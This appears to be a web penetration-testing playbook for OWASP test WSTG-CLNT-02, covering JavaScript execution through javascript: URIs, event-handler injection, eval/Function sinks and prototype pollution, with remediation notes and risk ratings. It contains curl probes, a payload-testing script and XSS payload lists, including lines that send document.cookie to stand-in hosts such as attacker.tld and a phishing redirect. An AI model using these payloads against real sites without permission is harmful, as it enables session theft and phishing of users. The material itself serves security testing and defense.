---
name: wstg-clnt-02
description: "Testing for JavaScript Execution"
category: client-side
owasp_id: WSTG-CLNT-02
version: "1.0.0"
author: cyberstrike-official
tags: [client-side, javascript, dom, cors, wstg, clnt]
tech_stack: []
cwe_ids: [CWE-79]
chains_with: [wstg-clnt-01, wstg-clnt-11]
prerequisites: [wstg-conf-01, wstg-conf-02]
severity_boost:
  wstg-clnt-11: "eval()/Function() sink reachable via postMessage = an attacker-controlled cross-origin page executes arbitrary JS directly in the victim's authenticated session, no same-origin injection point needed — Critical"
---

# wstg-clnt-02

## Test ID

WSTG-CLNT-02

## Test Name

Testing for JavaScript Execution

## High-Level Description

This test identifies scenarios where user input can lead to arbitrary JavaScript execution through various vectors including javascript: URIs, event handlers, and dynamic code evaluation.

---

## What to Check

- [ ] javascript: URI handling
- [ ] Event handler injection
- [ ] eval() with user input
- [ ] Function constructor abuse
- [ ] Template literal injection

---

## How to Test

### Step 1: Test javascript: URI

```bash
# Test link href
curl -s "https://target.com/redirect?url=javascript:alert(1)"

# Test image src
curl -s "https://target.com/profile?avatar=javascript:alert(1)"
```

### Step 2: Test Event Handler Injection

```python
#!/usr/bin/env python3
import requests

def test_event_handlers(url, param):
    payloads = [
        '" onmouseover="alert(1)" x="',
        "' onfocus='alert(1)' autofocus='",
        '" onclick="alert(1)" style="position:fixed;width:100%;height:100%" x="',
        "javascript:alert(1)",
        "data:text/html,<script>alert(1)</script>",
    ]

    for payload in payloads:
        response = requests.get(url, params={param: payload})
        if payload.split('=')[0] in response.text:
            print(f"[POTENTIAL] Payload reflected: {payload[:40]}")

# Usage
test_event_handlers("https://target.com/search", "q")
```

### Step 3: Dynamic Evaluation Testing

```javascript
// Check if user input reaches eval/Function
// Common patterns to look for in JS:

// Dangerous
eval(userInput)
new Function(userInput)()
setTimeout(userInput, 1000)
setInterval(userInput, 1000)

// Test payloads
// alert(1)
// 1+1
// fetch('https://attacker.com?'+document.cookie)
```

---

## Tools

| Tool                 | Purpose                                           |
| --------------------- | -------------------------------------------------- |
| **Burp Suite**         | Intercept/repeat requests with JS-execution payloads |
| **Browser DevTools**   | Watch console/network for eval/Function execution   |
| **DOM Invader (Burp)** | Detect `eval`/`Function` sinks fed by tainted data   |

---

## Example Commands/Payloads

### javascript: URI payloads

```
javascript:alert(document.domain)
javascript:fetch('https://attacker.tld/c?c='+document.cookie)
javascript:void(document.location='https://attacker.tld/phish')
data:text/html,<script>alert(document.domain)</script>
```

### Event handler injection payloads

```
" onmouseover="alert(document.domain)" x="
' onfocus='alert(document.domain)' autofocus='
" onclick="alert(document.domain)" style="position:fixed;width:100%;height:100%" x="
"><svg onload=alert(document.domain)>
```

### curl probes

```bash
TARGET="https://{target}"
curl -s "$TARGET/redirect?url=javascript:alert(1)"
curl -s "$TARGET/profile?avatar=javascript:alert(1)"
curl -s "$TARGET/search?q=%22%20onmouseover%3D%22alert(1)%22%20x%3D%22"
```

### eval()/Function() confirmation payloads

```javascript
alert(1)
1+1
fetch('https://attacker.tld/c?c='+document.cookie)
(function(){return this})().alert(1)
```

### Prototype-pollution-driven JS execution

If `{target}` merges untrusted JSON into an object (e.g. `Object.assign({}, config, JSON.parse(untrustedInput))`) and a client-side "gadget" later passes an inherited property into `eval`/`Function`/`setTimeout(string)`, polluting `Object.prototype` can trigger execution without any direct injection point:

```javascript
// Confirm pollution reaches Object.prototype (paste in console / via a vulnerable merge endpoint)
{"__proto__": {"evilProperty": "evilPayload"}}
{"constructor": {"prototype": {"evilProperty": "evilPayload"}}}

// Found in the wild - pollution via URL/hash fed into a client-side merge
https://{target}/#__proto__[evilProperty]=evilPayload
https://{target}/?__proto__[sourceUrl]=data:,alert(document.domain)//
```

```javascript
// Example gadget: an app-wide config object with a "src"/"onerror"-style property
// consumed later by a script/image loader that effectively evals attacker data
Object.prototype.src = "x"
Object.prototype.onerror = "alert(document.domain)"
// any subsequently created <img> that inherits unset src/onerror from a polluted
// object literal will now execute the attacker's handler
```

Search `Object.prototype` / `client-side prototype pollution` gadget databases (e.g. BlackFan/client-side-prototype-pollution) for the specific sink `{target}`'s bundled JS exposes before crafting a target-specific gadget.

---

## Remediation

```javascript
// Never use eval with user input
// AVOID: eval(userInput)

// Use safe alternatives
JSON.parse(jsonString) // For JSON parsing

// For dynamic function calls, use allowlist
const allowedFunctions = { sum: (a, b) => a + b }
if (allowedFunctions[functionName]) {
  allowedFunctions[functionName](args)
}
```

---

## Risk Assessment

| Finding                   | CVSS | Severity |
| ------------------------- | ---- | -------- |
| javascript: URI execution | 6.1  | Medium   |
| Event handler injection   | 6.1  | Medium   |
| eval() with user input    | 8.6  | High     |

---

## CWE Categories

| CWE ID     | Title                                                               |
| ---------- | ------------------------------------------------------------------- |
| **CWE-95** | Improper Neutralization of Directives in Dynamically Evaluated Code |


---

## References

- [OWASP WSTG - Testing for JavaScript Execution (WSTG-CLNT-02)](https://owasp.org/www-project-web-security-testing-guide/v42/4-Web_Application_Security_Testing/11-Client-side_Testing/02-Testing_for_JavaScript_Execution)
- [OWASP DOM based XSS Prevention Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/DOM_based_XSS_Prevention_Cheat_Sheet.html)
- [PayloadsAllTheThings - XSS Injection](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/XSS%20Injection)
- [PayloadsAllTheThings - Prototype Pollution](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Prototype%20Pollution)

---

## Checklist

```
[ ] javascript: URI tested
[ ] Event handlers tested
[ ] eval() usage analyzed
[ ] Template literals checked
[ ] Findings documented
```
